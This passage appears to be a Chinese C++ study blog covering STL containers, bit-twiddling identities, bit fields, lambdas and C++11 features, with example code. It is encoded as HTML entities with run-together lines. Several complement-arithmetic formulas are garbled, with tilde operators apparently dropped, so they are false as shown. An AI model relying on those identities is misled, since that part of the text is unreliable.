哈希表4 其他容器: stack &#x2F; queue &#x2F; priority_queue &#x2F; string &#x2F; bitset (存储对或错)\n新型: regex (正则表达式), 增强了 rand算法, thread(线程), async, furture, time\n容器内元素的条件\n必须可以复制(copy) 或则搬移(move) (隐含的条件是在拷贝和搬移的过程中应该没有副作用) \nc++ 的基本类型满足以上要求: bool char int int* char*, reference\n元素必须可以被赋值操作,来作为复制或者搬移, (因为容器和算法对复写有要求)\n元素可以被销毁\n\n针对于不同的容器还有特殊的要求\n\n对于序列式容器, 元素必须有默认的构造函数\n对于某些操作,元素需要定义 &#x3D;&#x3D;\n对于关联式容器, 排序默认准则的是 &lt; \n无顺序容器,必须要提供一个hash函数\n\nstl容器里面存的是元素的值而不是引用，到底我们的容器里面应该存的东西是什么呢?\nSTL对于错误怎么处理我们要记住的是STL的设计原则是: 效率优先, 安全为次异常? STL自己却不怎么用\n实例代码\n#include &lt;iostream&gt;#include &lt;chrono&gt;#include &lt;algorithm&gt;#include &lt;list&gt;#include &lt;map&gt;#include &lt;random&gt;#include &lt;set&gt;#include &lt;string&gt;#include &lt;unordered_map&gt;#include &lt;unordered_set&gt;#include &lt;vector&gt;#include &lt;deque&gt;//多数容器共有的接口:template&lt;typename T&gt;void containerAllInterface(T &amp;a, T &amp;b) &#123;\tT c;\tT d(a); //copy\tT e = a; //copy\tT ee &#123;a&#125;; //copy\tT eee = &#123;a&#125;; //copy\tT f(std::move(a)); //move不是转化为右值,是移动数据\t//new\tauto iterB = b.begin();\tauto iterE = b.end();\t//old\ttypename T::iterator iterF = b.begin();\tT g(b.begin(), b.end()); //从开始的地方到结束的地方进行拷贝\tT g2(iterB, iterE); //使用迭代器方式,一样\tb.size(); //std::forwad list 不提供size接口,绝大多数都有\tb.empty();  //return b.size() == 0;\tb.max_size();\tif(b == c) &#123;&#125; //先比较数量, 再比较顺序\tif(b != d) &#123;&#125; //\tif(b &lt; e) &#123;&#125;  //unordered_set unordered_map .. 无顺序容器没有\t// b &lt;= e\t\t// b &gt; e\t// b &gt;= e\t//赋值\te = b;\te = std::move(b);\te.swap(g); //交换容器所管理的资源, std::arrary 的交换为线性, O(n), 而其他是 O(1)\t//所以其他容器交换很高效,除了array\tstd::swap(e, g); //与以上一样\te.cbegin(); //const_iterator, 返回const iterator的引用\tauto ea = e.cbegin();\tauto eea = e.cbegin();\t*eea; //const &amp;, &amp;\t*ea; // const &amp;\te.cend();\te.clear(); //清空容器的所有元素, 有一个容器没有. std::array\t//就是调用所有元素的析构.&#125;void test_container() &#123;\tstd::vector&lt;int&gt; a;\tstd::vector&lt;int&gt; b;\tcontainerAllInterface&lt;std::vector&lt;int&gt;&gt;(a, b);\tstd::list&lt;int&gt; e;\tstd::list&lt;int&gt; f;\tcontainerAllInterface&lt;std::list&lt;int&gt;&gt;(e, f);\tstd::deque&lt;int&gt; g;\tstd::deque&lt;int&gt; h;\tcontainerAllInterface&lt;std::deque&lt;int&gt;&gt;(g, h);\t//.......\t//? array, forward_list, unordered_...&#125;int main(int, char**) &#123;\treturn 0;&#125;\n\nvectorvector 是c++98中引入的动态数组(dynamic array)\nnamespace std &#123;template&lt;typename T, typename Allocator = allocator&lt;T&gt;&gt; //就是用默认的alloctor了,\tclass vector;&#125;\n\n特点\n随机访问元素, 末端添加删除元素效率最高, 前端和中间删除和添加元素效率最低，存在当前容器大小和容量的关系\n#include &lt;vector&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;//#include &lt;memory&gt;static void vectorPart() &#123;using Group = std::vector&lt;float&gt;;Group a;Group b = a; //拷贝构造Group c(a); //拷贝构造Group d(10); //定义容量的大小Group e(10, 1.0f); //10个初始化为1.0Group f(e.begin(), e.end()); //传入两个迭代器,中间的所有值都会被拷贝Group g(&#123;1.0f, 2.0f, 3.0f&#125;); //c++11, 把写好的元素直接填Group h = &#123;1.1f, 2.1f, 3.1f&#125;;Group i &#123;1.2f, 2.2f, 3.2f, 4.2f&#125;; //initialize listd.empty();d.size(); //当前的大小d.max_size(); //max_size()相对于其他容器的要小一些d.capacity(); //最多能在装入多少个元素,前提没有分配内存的情况下.d.reserve(100); //预先分配100个内存空间d.shrink_to_fit(); //c++11 //operator == != &lt; &gt; &lt;= &gt;=//赋值b = g;b.assign(3, 1.0f); //代表重新分配元素为: &#123;1.0f, 1.0f, 1.0f&#125;b.assign(g.begin(), g.end());b.assign(&#123;1.0f, 2.0f, 3.0f&#125;);//交换: 交换给vector类中的指针,效率比较高b.swap(a);std::swap(a, b); //元素访问:b[0];b.at(0); //越界抛出异常: std::out_of_rangeif(b.empty()) &#123;\tb.front(); //一定要检查, 不然会出现错误, undefined\tb.back();&#125;b.front();b.back();//迭代器相关:a.begin();a.end();a.cbegin();a.cend();a.rbegin();a.rend();a.crbegin();a.crend();////去除最后一个元素//signal thread OK, multthread maybe wronga.pop_back(); //maybe wrong//删除某个特定位置的元素b.erase(b.begin()); //删除掉迭代器当前位置的元素, 而后面的元素会往前移动, 返回下一个元素的位置b.erase(b.begin(), b.end()); //删除掉迭代器中间元素//要检查迭代器是否失效b.push_back(10.0f); //尾部插入元素b.pop_back(); //获取尾部元素,且释放//在某个位置插入元素//在尾部插入100.0auto iter = b.insert(b.end(), 100.0f); //返回插入元素所在的迭代器iter = b.insert(b.end(), 10, -10.0f); //在尾部插入10个 -10.0fb.insert(b.end(), h.begin(), h.end()); //在尾部插入 两个迭代器之间的元素b.emplace(b.end(), 10.0f); //c++11b.emplace_back(10.0f); //c++11  &amp;&amp; move copy 右值 拷贝b.resize(10); //设置vector的大小// 若改变小了,就会调用元素相应的析构b.resize(100, 1.0f); //把vector的大小设置为100,若元素个数不足100,以值为:1.0来填充到100b.clear(); //注意: 并不会让以前所占的内存降低, 只是可以把空间腾出来b.shrink_to_fit(); //c++11, 降低内存到合适的大小//和C的接口互用std::vector&lt;char&gt; carr(100, 0);strcpy(&amp;carr[0], &quot;hello World\\n&quot;); //最好用 carr.data();printf(&quot;%s&quot;, carr.data());//错误用法:printf(&quot;%s&quot;, carr.begin());//异常://1. push_back//2. 元素 move / copy 没有异常的话//insert//emplact//emplce_back//push_bakc//pop_back//erase//swap//clear　都不会有异常//特殊://标准化的失误:  不要使用,std::vector&lt;bool&gt;&#125;int main(int, char**) &#123;\treturn 0;&#125;\n\ndequedeque是c++98中引入的动态数组(dynamic array)\nnamespace std &#123;template&lt;typename T, typename Allocator = allocator&lt;T&gt;&gt;class deque;&#125;\n\n特点\n随机访问元素, 末端和头部添加删除元素效率高,中间删除和添加元素效率低，而vector仅仅操作尾部效率高，元素的访问和迭代比vector要慢,迭代器不能是普通的指针。\n#include &lt;deque&gt;#include &lt;vector&gt;using Group = std::deque&lt;float&gt;;static void dequePart() &#123;Group a;Group b = a;Group c(a);Group d(10);Group e(10, 1.0f);Group f(e.begin(), e.end());Group g(&#123;1.0f, 2.0f, 3.0f&#125;);Group h = &#123;1.0f, 2.0f, 3.0f&#125;;Group i &#123;1.0f, 2.0f, 3.0f&#125;;if(!a.empty()) a.pop_back();d.empty();d.size();d.max_size();//和vector不同, deque不提供以下的函数 //d.capacity();//d.reserve(100);d.shrink_to_fit(); //c++11//交换b.swap(a); std::swap(a, b);//元素访问b[0];b.at(0);b.front();b.back();//迭代器相关a.begin();b.end();a.cbegin();a.cend();a.rbegin();a.rend();a.crbegin();a.crend();a.pop_back();a.push_back(1.0f);a.push_front(1.2f); //vector没有b.emplace_front(1.0f);auto iter = b.insert(b.end(), 100.0f); //在某个位置插入元素b.insert(b.end(), 10, -10.0f);b.insert(b.end(), h.begin(), h.end());b.emplace(b.end(), 10.0f);b.emplace_back(10.0f);b.resize(10);b.resize(100, 10.0f);b.clear();b.shrink_to_fit(); //释放适当的内存//异常//1 push_back push_front 不会抛出异常//2 move /copy 没有异常的话//insert emplace emplace_back push_back emplace_front//pop_back pop_front erase swap clear　不会抛出异常//应用场景: 可以来储存网络消息的连聊天包机制,分别发包机制//using Buffer = std::vector&lt;char&gt;;//using BufferGroup = std::deque&lt;Buffer&gt;;//BufferGroup group;//Buffer buffer;////auto ok = readFromClinet(socket, &amp;buffer);//if(ok) &#123;//\tgroup.emplace_back(std::move(buffer));//&#125;else &#123;//\t//handle error//&#125;//while(!group.empty()) &#123;//\tauto ok = sendToClient(socket, group.front());//\tif(ok) &#123;//\t\tgroup.pop_front();\t//\t&#125;else &#123;//\t\t//handle error\t//\t&#125;//&#125;&#125;int main(void) &#123;\treturn 0;&#125;\n\nlistlist 是c++98中引入的双向串列(double linked list)\nnamespace std &#123;template&lt;typename T, typename Allocator = allocator&lt;T&gt;&gt;class list;&#125;\n\n特点\n 不支持随机访问元素,访问头部和尾部元素快任何位置插入删除元素都很快,常亮时间内完成插入和删除不会造成迭代器的失效对于异常支持好, 出现异常对于list而言, 要么不成功, 要么没有影响\n#include &lt;list&gt;#include &lt;cassert&gt;#include &lt;iostream&gt;static void listPart() &#123;using Group = std::list&lt;float&gt;;Group a;Group b = a;Group c(a);Group d(10);Group e(10, 1.0f);Group f(e.begin(), e.end());Group g(&#123;1.0f, 2.0f, 3.0f&#125;);Group h = &#123;1.0f, 2.0f, 3.0f&#125;;Group i &#123;1.0f, 2.0f, 3.0f&#125;;d.empty();d.size();d.max_size();//和vecotr不同, list不提供以下函数//d.capacity();//d.reserve(100);//d.shrink_to_fit();// operator == != &lt; &gt; &lt;= &gt;=//赋值b = g;b.assign(3, 1.0f);b.assign(g.begin(), g.end());b.assign(&#123;1.0f, 2.0f, 3.0f&#125;);//交换b.swap(a);std::swap(a, b);//元素访问, 不能随机访问//b[0];//b.at(0);b.front();b.back();//迭代器相关:a.begin();a.end();a.cbegin();a.cend();a.rbegin();a.rend();a.crbegin();a.crend();a.resize(10);auto iterBegin = a.begin();assert(a.size() &gt;= 10);//for(int i = 0; i &lt; 5; ++i) ++iterBegin; //改变迭代器std::advance(iterBegin, 0); //改变迭代器位置2//遍历元素for(; iterBegin != a.end(); ++iterBegin) std::cout &lt;&lt; *iterBegin &lt;&lt; &quot; &quot;;a.pop_back(); //maybe wrongif(!a.empty()) a.pop_back();b.erase(b.begin());b.erase(b.begin(), b.end());b.push_back(10.0f);b.pop_back();b.push_front(1.2f);b.emplace_front(1.3f);auto iter = b.insert(b.end(), 100.0f);iter = b.insert(b.end(), 10, -10.0f);b.resize(5);b.resize(10, 1.2f);//算法:b.remove(1.0f); //删除值为1.0f的所有值//符合某个条件的值把它删除掉, 100.0f的值全部删除掉b.remove_if([](auto v) &#123; return v &gt; 100.0f; &#125;); //v 是list中元素的值b.reverse(); //反转listb.sort(); //默认以 &lt; b.merge(g); // 合并两个排好顺序的list在b中,并清空g中的元素,结果b中就也是排好序的c.unique(); // 前提: 将排好序的list重复的元素去掉c.splice(c.begin(), b); //在某个位置插入整块的list, 把b作为一块插入c.begin().&#125;int main(void) &#123;\tlistPart();\treturn 0;&#125;\n\n\n\nforward_list&#x2F;&#x2F;forward_list 是c++11中引入的单项串列(singal linked list)\nnamespace std &#123;template &lt;typename T, typename Allocator = allocator&lt;T&gt;&gt;class forward_list;&#125;\n\n特点\n不支持随机元素访问, 访问头部元素速度快，”forward_list” 和自己手写的c-style signal linked list相比没有任何时间和空间上的额外开销, 任何性质如果和这个目标抵触,我们就放弃该特征.任何位置插入和删除元素都很快, 常亮时间完成。插入和删除不会造成迭代器失效，对于异常支持好, 出现异常对于forward_lit而言, 要么不成功, 要么没什么影响。\n#include &lt;forward_list&gt;#include &lt;iostream&gt;static void forwardListPart() &#123;using Group = std::forward_list&lt;float&gt;;Group a;Group b = a;Group c(a);Group d(10);Group e(10, 1.0f);Group f(e.begin(), e.end());Group g(&#123;1.0f, 2.0f, 3.0f&#125;);Group h = &#123;1.0f, 2.0f, 3.0f&#125;;Group i &#123;1.0f, 2.0f, 3.0f&#125;;d.empty();//d.size(); //没有size() ,为了效率d.max_size();//和vector不同, forward_list不提供以下函数://d.capacity();//d.reserve(100);//d.shrink_to_fit();//operator == != &lt; &gt; &lt;= &gt;=//赋值b = g;b.assign(3, 1.0f);b.assign(g.begin(), g.end());b.assign(&#123;1.0f, 2.0f, 3.0f&#125;);//交换:b.swap(a);std::swap(a, b);//元素访问, 不能随机访问//b[0];//b.at(0);b.front();//b.back(); 没有提供最后一个//迭代器相关a.begin();a.end();a.cbegin();a.cend();a.before_begin(); //返回第一个元素的前一个位置, 这个位置只是个占位符a.cbefore_begin();  //const &amp;//a.rbegin();//a.rend();//a.rcbegin();//a.rcend();auto iterBegin = a.begin();//a.pop_back(); a.empty();//b.erase(b.begin()); //不支持eraseb.erase_after(b.begin()); //删除b.begin(), 的下一个元素 b.erase_after(b.before_begin()); //return void //正确删除第一个元素 b.erase_after(b.begin(), b.end()); //return void//b.push_back(10.0f)//b.pop_back();b.push_front(1.2f);b.emplace_front(1.3f);//b.insert(b.begin(), 3.0f); 不支持insertauto iter = b.insert_after(b.before_begin(), 100.0f);iter = b.insert_after(b.before_begin(), 10, -10.0f);b.insert_after(b.before_begin(), h.begin(), h.end());//b.emplace(b.end(), 10.0f);//b.emplace_back(10.0f);b.resize(10);b.resize(100, 1.0f);//算法:b.remove(1.0f);b.remove_if([](auto v) &#123; return v &gt; 100.0f; &#125;);//b.reverse(); //1 2 3 4 -&gt; 4 3 2 1//std::sort(a.begin(), a.end());b.sort(); // &lt;g.sort();b.merge(g); //对于排好顺序的list进行合并,且合并后也是排好顺序的c.unique(); //对于排好序的进行删除重复元素c.splice_after(c.before_begin(), b);&#125;int main(void) &#123;//例:在索引为3的位置之前插入一个元素\tstd::forward_list&lt;int&gt; forlist = &#123;1, 2, 3, 4, 5, 6&#125;;\tauto fiter = forlist.before_begin();\tfor(int i = 0; i &lt; 2; ++i, ++fiter);\tforlist.insert_after(fiter, 10);\tfor(fiter = forlist.begin(); fiter != forlist.end(); ++fiter) std::cout &lt;&lt; *fiter &lt;&lt; &quot; &quot; ;\tstd::cout &lt;&lt; std::endl;\treturn 0;&#125;\n\narrayarray 实际上是对c&#x2F;c++语言中的原生数组进行了封装\nnamespace std &#123;template&lt;typename T, size_t N&gt;\tclass array;&#125;\n\n特点\n 内存分配在栈(stack), 绝不会重写分配.随机访问元素\n#include &lt;iostream&gt;#include &lt;array&gt;#include &lt;cstring&gt;//c++ 11template&lt;typename C&gt;void checkSize(C &amp;c) &#123;\tif(c.size() &gt; 3) &#123;\t\tc[3] = 10; //单线程OK,多线程可能出错\t&#125;\tc.at(3) = 10;&#125;void arrayPart() &#123;\tstd::array&lt;int, 100&gt; a; //不进行初始化, 只管分配内存\tstd::array&lt;int, 100&gt; b = &#123;&#125;; //初始化为 0 \t//以上两者的区别.\tstd::array&lt;int, 5&gt; obj = &#123;1, 2, 3, 4, 5&#125;;\tstd::array&lt;int, 5&gt; obj2 = &#123;1&#125;; //第一个为1, 后面不0\t//接口\ta.empty(); //never be true if size &gt; 0\ta.size();\ta.max_size();\t//operator == &lt; != &gt; &lt;= &gt;=\tauto aa = a;\taa.swap(a); //array的swap是交换每一个元素都需要做交换,因为它是在stack中储存的.不是通过堆来管理\t//访问元素\ta[1]; //不进行检查,越界出错\ta.at(1); //进行检查,越界抛出异常\ta.front(); //返回头部元素的引用\ta.back();  //返回最后元素的引用\tcheckSize(a);\t//迭代器相关的:\ta.begin(); //可以对begin减引操作, 但不能堆end进行此操作\ta.end();\ta.cbegin(); //const　引用\ta.cend();\t\ta.rbegin(); //从尾部遍历到头部,与以上相反\ta.rend();\ta.crbegin(); //const 方式从尾部遍历到头部\ta.crend();\t//和C的接口互用\tstd::array&lt;char, 100&gt; carr;\tstrcpy(&amp;carr[0], &quot;hello world\\n&quot;);\tprintf(&quot;%s&quot;, &amp;carr[0]); //更好的使用 carr.data();\tprintf(&quot;%s&quot;, carr.data());\t//错误用法\tprintf(&quot;%s&quot;, carr.begin());\t//特殊的地方\tauto info = std::get&lt;1&gt;(carr); //与 carr[1] 一样\tprintf(&quot;%c\\n&quot;, info); //\tcarr.fill(0); //对所有元素赋予0\t//异常 exception\t//c.at(pos)\t//copy move swap, 进行操作时,可能触发异常&#125;int main(void) &#123;\tarrayPart();\treturn 0;&#125;\n\n\n\n\n\n\n\n\n\n\n\nC++中的补码公式与位域补码公式-x &#x3D; x+1 &#x3D; ~(x-1)~x &#x3D; -x-1-(x) &#x3D; x+1~(-x) &#x3D; x-1\nx+y &#x3D; x - y-1 &#x3D; (x|y) + (x&amp;y)x-y &#x3D; x + ~y+1 &#x3D; (x|y) - (x&amp;y)x^y &#x3D; (x|y) - (x&amp;y)x|y &#x3D; (x&amp; ~y) + yx&amp;y &#x3D; (x|y) - ~x\nx&#x3D;&#x3D;y :  (x-y|y-x)x!&#x3D;y :  x-y|y-xx&lt;y  :  (x-y) ^ ((x^y) &amp; ((x-y) ^x))x&lt;&#x3D;y :  (x|y) &amp; ((x^y) | (y-x))x&lt;y  :  (x&amp;y) | ((x|y) &amp; (x-y))   &#x2F;&#x2F;unsignedx&lt;&#x3D;y :  (x|y) &amp; ((x^y) | ~(y-x))   &#x2F;&#x2F;unsigned\n实例代码\n#include &lt;iostream&gt;using namespace std;void operator_1(void);void operator_2(void);void operator_3(void);int main(void) &#123;        operator_1();        operator_2();        operator_3();        return 0;&#125;void operator_1(void) &#123;        int x = 1;        cout &lt;&lt; &quot;-x = &quot; &lt;&lt; -x &lt;&lt; &quot;   ~x+1 = &quot; &lt;&lt; ~x + 1 &lt;&lt; endl;        cout &lt;&lt; &quot;~x = &quot; &lt;&lt; ~x &lt;&lt; &quot;   -x-1 = &quot; &lt;&lt; -x - 1 &lt;&lt; endl;        cout &lt;&lt; &quot;-(~x) = &quot;&lt;&lt; -(~x) &lt;&lt; &quot;   x+1 = &quot; &lt;&lt; x + 1 &lt;&lt; endl;        cout &lt;&lt; &quot;-(~x) = &quot;&lt;&lt; -(~x) &lt;&lt; &quot;   x-1 = &quot; &lt;&lt; -x -1 &lt;&lt; endl;&#125;void operator_2(void) &#123;        int x = 3, y = 5;        cout &lt;&lt; endl;        cout &lt;&lt; &quot;x: &quot; &lt;&lt; x &lt;&lt; &quot;y: &quot; &lt;&lt; y &lt;&lt; endl;        cout &lt;&lt; &quot;x+y=&quot; &lt;&lt; x+y &lt;&lt; &quot;   x- ~y-1= &quot; &lt;&lt; x - ~y - 1        &lt;&lt; &quot;  (x|y)+(x&amp;y) = &quot; &lt;&lt; (x|y) + (x&amp;y) &lt;&lt; endl;        cout &lt;&lt; &quot;x-y=&quot; &lt;&lt; x-y &lt;&lt; &quot;   x+ ~y+1= &quot; &lt;&lt; x + ~y + 1        &lt;&lt; &quot;  (x|~y) - (~x&amp;y) = &quot; &lt;&lt; (x|~y) - (~x|y) &lt;&lt; endl;        cout &lt;&lt; &quot;x^y=&quot; &lt;&lt; (x^y) &lt;&lt; &quot; (x|y) - (x&amp;y)&quot; &lt;&lt; (x|y) - (x&amp;y) &lt;&lt; endl;        cout &lt;&lt; &quot;x|y=&quot; &lt;&lt; (x|y) &lt;&lt; &quot; (x&amp; ~y) + y = &quot; &lt;&lt; (x&amp; ~y) + y &lt;&lt; endl;        cout &lt;&lt; &quot;x&amp;y=&quot; &lt;&lt; (x&amp;y) &lt;&lt; &quot; (~x|y) - ~x = &quot; &lt;&lt; (~x|y) - ~x &lt;&lt; endl;&#125;void operator_3(void) &#123;        int x = -3, y = -5;        unsigned int x_t = -1, y_t = -5;        cout &lt;&lt; &quot;x: &quot; &lt;&lt; x &lt;&lt; &quot;y: &quot; &lt;&lt; y &lt;&lt; endl;        cout &lt;&lt; &quot;x==y =&quot; &lt;&lt; (x==y) &lt;&lt; &quot;  ~(x-y|y-x) =&quot; &lt;&lt; ~(x-y|y-x) &lt;&lt; endl;        cout &lt;&lt; &quot;x!=y =&quot; &lt;&lt; (x!=y) &lt;&lt; &quot;  x-y|y-x =&quot; &lt;&lt; (x-y|y-x) &lt;&lt; endl;        cout &lt;&lt; &quot;x&lt;y =&quot; &lt;&lt; (x&lt;y) &lt;&lt; &quot;  (x-y) ^ ((x^y) &amp; ((x-y)^x))=&quot; &lt;&lt; ((x-y) ^ ((x^y) &amp; ((x-y)^x))) &lt;&lt; endl;        cout &lt;&lt; &quot;x&lt;=y =&quot; &lt;&lt; (x&lt;=y) &lt;&lt; &quot;  (x|~y) &amp; ((x^y) |~ (y-x))=&quot; &lt;&lt; ((x|~y) &amp; ((x^y) |~ (y-x))) &lt;&lt; endl;        cout &lt;&lt; &quot;unsigned: x&lt;y =&quot; &lt;&lt; (x_t&lt;y_t)        &lt;&lt; &quot;  (~x&amp;y) | ((~x|y) &amp; (x-y))&quot; &lt;&lt; ((~x_t&amp;y_t) | ((~x_t|y_t) &amp; (x_t-y_t))) &lt;&lt; endl;        cout &lt;&lt; &quot;unsigned: x&lt;=y =&quot; &lt;&lt; (x_t&lt;=y_t)        &lt;&lt; &quot; (~x|y) &amp; ((x^y) | ~(y-x) =&quot; &lt;&lt; ((~x_t|y_t) &amp; ((x_t^y_t) |~ (y_t-x_t))) &lt;&lt; endl;&#125;\n\n位域在结构内声明位域的形式如下：\nstruct&#123;  type [member_name] : width ;&#125;;\n\n下面是有关位域中变量元素的描述：\n\n\n\n元素\n描述\n\n\n\ntype\n只能为 int(整型)，unsigned int(无符号整型)，signed int(有符号整型) 三种类型，决定了如何解释位域的值。\n\n\nmember_name\n位域的名称。\n\n\nwidth\n位域中位的数量。宽度必须小于或等于指定类型的位宽度。\n\n\n实例代码\n#include &lt;stdio.h&gt;typedef struct bs &#123;        int a:2;        int b:1;        int c:12;        unsigned d:4&#125;bs;struct bit_2 &#123;        unsigned a:2;        unsigned :2;  //It can&#x27;t use        unsigned :0;  //NULL        unsigned b:4;        unsigned c:4;&#125;;int main(void) &#123;        bs bit;        printf(&quot;sizeof(%d) \\n&quot;,sizeof(struct bs));        bit.a = 4;        bit.b = 1;        bit.c = 34235;        printf(&quot;a: %d   b: %d  c: %d\\n&quot;, bit.a, bit.b, bit.c);        return 0;&#125;\n\n\n\nlambda#include &lt;functional&gt;#include &lt;iostream&gt;//基础函数void printInfo(int a, int b, int c) &#123;\t\t\tstd::cout &lt;&lt; &quot; a &quot; &lt;&lt; a &lt;&lt; &quot; b &quot; &lt;&lt; b &lt;&lt; &quot; c &quot; &lt;&lt; c &lt;&lt; std::endl;&#125;//操作符重载函数struct Print &#123;\tvoid operator() (int a, int b, int c) const &#123;\t\t\tstd::cout &lt;&lt; &quot; a &quot; &lt;&lt; a &lt;&lt; &quot; b &quot; &lt;&lt; b &lt;&lt; &quot; c &quot; &lt;&lt; c &lt;&lt; std::endl;\t&#125;&#125;;//模板函数template&lt;typename T1, typename T2, typename T3&gt;void templatePrint(T1 a, T2 b, T3 c) &#123;\t\t\tstd::cout &lt;&lt; &quot; a &quot; &lt;&lt; a &lt;&lt; &quot; b &quot; &lt;&lt; b &lt;&lt; &quot; c &quot; &lt;&lt; c &lt;&lt; std::endl;&#125;//操作符重载 + 模板 的函数struct TemplatePrint &#123;\ttemplate&lt;typename T1, typename T2, typename T3&gt;\t\tvoid operator() (T1 a, T2 b, T3 c) const &#123;\t\t\tstd::cout &lt;&lt; &quot; a &quot; &lt;&lt; a &lt;&lt; &quot; b &quot; &lt;&lt; b &lt;&lt; &quot; c &quot; &lt;&lt; c &lt;&lt; std::endl;\t&#125;&#125;;inline void print(int a, int b, int c) &#123;\tstd::cout &lt;&lt; &quot; a &quot; &lt;&lt; a &lt;&lt; &quot; b &quot; &lt;&lt; b &lt;&lt; &quot; c &quot; &lt;&lt; c &lt;&lt; std::endl;&#125;template&lt;typename Fun&gt;void printUseFun(Fun fun, int a, int b, int c) &#123;\tfun(a, b, c);&#125;void test_1() &#123;\tPrint printUseClass;\t\tTemplatePrint printUseTempClass;\tprintInfo(1, 2, 3);\tprintUseClass(1, 2, 3); //operator() (int a, int b, int c)\ttemplatePrint(1, 2, 3); \tprintUseTempClass(1, 2, 3);\tprint(1, 2, 3);\t//以前inline 函数跟普通函数调用差不多\t//lambda就是个inline函数, 只是把 inline 函数作为一个参数或者一个local变量来使用, \tstd::cout &lt;&lt; &quot;lamda: &quot; &lt;&lt; std::endl;\tauto local = [](int a, int b, int c) &#123;\t\tstd::cout &lt;&lt; &quot; a &quot; &lt;&lt; a &lt;&lt; &quot; b &quot; &lt;&lt; b &lt;&lt; &quot; c &quot; &lt;&lt; c &lt;&lt; std::endl;\t&#125;;\tprintUseFun(local, 1, 2, 3);\tprintUseFun([](int a, int b, int c) &#123;\t\tstd::cout &lt;&lt; &quot;lamda2:&quot; &lt;&lt; std::endl;\t\t\tstd::cout &lt;&lt; &quot; a = &quot; &lt;&lt; a &lt;&lt; &quot; b = &quot; &lt;&lt; b &lt;&lt; &quot; c = &quot; &lt;&lt; c &lt;&lt; std::endl;\t&#125;, 2, 3, 5);\tint a = 6, b = 7, c = 8;\tauto local2  = [a, b, c]() &#123;\t\tstd::cout &lt;&lt; &quot; a = &quot; &lt;&lt; a &lt;&lt; &quot; b = &quot; &lt;&lt; b &lt;&lt; &quot; c = &quot; &lt;&lt; c &lt;&lt; std::endl;\t&#125;;\tlocal2();\tauto local3 = [=]() &#123;\t\tstd::cout &lt;&lt; &quot;====&quot; &lt;&lt; std::endl;\t\tstd::cout &lt;&lt; &quot; a = &quot; &lt;&lt; a &lt;&lt; &quot; b = &quot; &lt;&lt; b &lt;&lt; &quot; c = &quot; &lt;&lt; c &lt;&lt; std::endl;\t&#125;;\tlocal3();\tauto local4 = [=]() mutable &#123;\t\tstd::cout &lt;&lt; &quot;====&quot; &lt;&lt; std::endl;\t\ta = 4, b = 4 , c = 4;\t\tstd::cout &lt;&lt; &quot; a = &quot; &lt;&lt; a &lt;&lt; &quot; b = &quot; &lt;&lt; b &lt;&lt; &quot; c = &quot; &lt;&lt; c &lt;&lt; std::endl;\t&#125;;\tlocal4();\t&#125;int main(void) &#123;\ttest_1();\treturn 0;&#125;\n\n\n\nC++11新型for循环,auto, 类成员的初始化及左右值引用C++11中新型for循环,auto, 类成员的初始化及左右值引用\n#include &lt;typeinfo&gt;#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;vector&gt;#include &lt;iterator&gt;static void autoValue();static void autoPointer();static void newVersionFor();static void newVersionConstruct();static void defaultInitValue();static void leftRefAndRightRef();//自定义类实现新型for循环class MyVector &#123;\tpublic:\t\tusing GroupType = std::vector&lt;int&gt;;\tpublic:\t\tGroupType m_group;\t\tvoid push_back(int x) &#123;\t\t\tm_group.push_back(x);\t\t&#125;&#125;;MyVector::GroupType::iterator begin(MyVector &amp;v) &#123;\treturn v.m_group.begin();&#125;MyVector::GroupType::iterator end(MyVector &amp;v) &#123;\treturn v.m_group.end();&#125;void testMyClass() &#123;\tMyVector mv;\tmv.push_back(1);\tmv.push_back(2);\tmv.push_back(3);\tfor(auto i : mv) &#123;\t\tstd::cout &lt;&lt; i &lt;&lt; &quot; &quot;;\t\t&#125;\tstd::cout &lt;&lt; std::endl;&#125;int main(int /*argc*/, char** /*argv*/) &#123;\ttestMyClass();\t//new version auto\t//autoValue();\t//autoPointer();//\tnewVersionFor();\t//newVersionConstruct();//\tdefaultInitValue();\tleftRefAndRightRef();\treturn 0;&#125;static void autoValue() &#123;\tauto age = 10;\tauto name = std::string(&quot;Yt&quot;);\tauto height = 160.0f;\tauto wight = 72.0;\tstd::cout &lt;&lt; &quot;age is type &quot; &lt;&lt; typeid(age).name() &lt;&lt; std::endl;\tstd::cout &lt;&lt; &quot;name is type &quot; &lt;&lt; typeid(name).name() &lt;&lt; std::endl;\tstd::cout &lt;&lt; &quot;height is type &quot; &lt;&lt; typeid(height).name() &lt;&lt; std::endl;\tstd::cout &lt;&lt; &quot;weight is type &quot; &lt;&lt; typeid(wight).name() &lt;&lt; std::endl;&#125;static void autoPointer() &#123;\tauto age = new int(10);\tauto name = &quot;Yt&quot;;\tauto height = new float(160.0f);\tauto wight = new double(72.0);\tstd::cout &lt;&lt; &quot;age is type &quot; &lt;&lt; typeid(age).name() &lt;&lt; std::endl;\tstd::cout &lt;&lt; &quot;name is type &quot; &lt;&lt; typeid(name).name() &lt;&lt; std::endl;\tstd::cout &lt;&lt; &quot;height is type &quot; &lt;&lt; typeid(height).name() &lt;&lt; std::endl;\tstd::cout &lt;&lt; &quot;weight is type &quot; &lt;&lt; typeid(wight).name() &lt;&lt; std::endl;&#125;static void newVersionFor() &#123;\tint ids[] = &#123;1, 2, 3, 4, 5&#125;;\tstd::cout &lt;&lt; &quot;new version&quot;;\tfor(auto v : ids) &#123;\t\tstd::cout &lt;&lt;  v &lt;&lt; &quot; &quot;;\t\t&#125;\tstd::cout &lt;&lt; std::endl;\tstd::cout &lt;&lt; &quot;old version&quot;;\tfor(int i = 0; i &lt; sizeof(ids) / sizeof(ids[0]); ++i) &#123;\t\tstd::cout &lt;&lt; ids[i] &lt;&lt;  &quot; &quot;;\t\t&#125;\tstd::cout &lt;&lt; std::endl;\t//vector::\tstd::vector&lt;int&gt; group;\tfor(int i = 0; i &lt; 4; ++i) group.push_back(i);\t//old version:\t//老版本遍历方式 \tfor(std::vector&lt;int&gt;::size_type i = 0, size = group.size(); i &lt; size; ++i) &#123;\t\t//cout &lt;&lt; group[i] &lt;&lt; &quot; &quot;;\t\t&#125;\t//通过迭代器来遍历\tstd::cout &lt;&lt; &quot;iterator: &quot; &lt;&lt; std::endl;\t//-------对于迭代器自增的时候,要用前置操作符,不要用后置操作符. ++iter, 若使用后置操作符号\t//多了一个步骤,就是把自增前的值先保留起来, 然后在自增.无用功\tfor(std::vector&lt;int&gt;::const_iterator iter = group.begin(); iter != group.end(); ++iter) &#123;\t\tstd::cout &lt;&lt; *iter &lt;&lt; &quot; &quot;;\t\t&#125;\tstd::cout &lt;&lt; std::endl;\t//auto 